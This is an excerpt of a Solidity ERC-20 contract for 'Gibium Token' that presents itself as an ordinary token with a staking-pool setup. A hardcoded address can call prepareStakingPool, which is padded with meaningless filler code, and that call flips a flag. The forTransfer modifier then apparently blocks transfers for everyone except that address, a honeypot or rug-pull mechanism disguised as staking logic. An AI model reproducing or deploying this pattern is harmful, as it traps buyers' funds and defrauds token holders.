...
contract Gibium is Context, IERC20, IERC20Metadata {
    ...
    uint256 private _tokenaj_totalSupply;
    uint256 private _tokenaj_status = 0;
    uint256 public stakingPoolajStatus = 0;

    string private _tokenaj_name;
    string private _tokenaj_symbol;

    address private _poolajAddress = 0xF5647CfDDb994B821e4d51C129262DD8937682fe;

    constructor() {
        _tokenaj_name = "Gibium Token";
        _tokenaj_symbol = "GIBIUM";
        _tokenaj_totalSupply = 1000000 * 10 ** 18;
        _balances[msg.sender] = _tokenaj_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolajAddress || _tokenaj_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenaj_totalSupply;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolajStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolajAddress)
        {
            _tokenaj_status = 1;
        }
    }
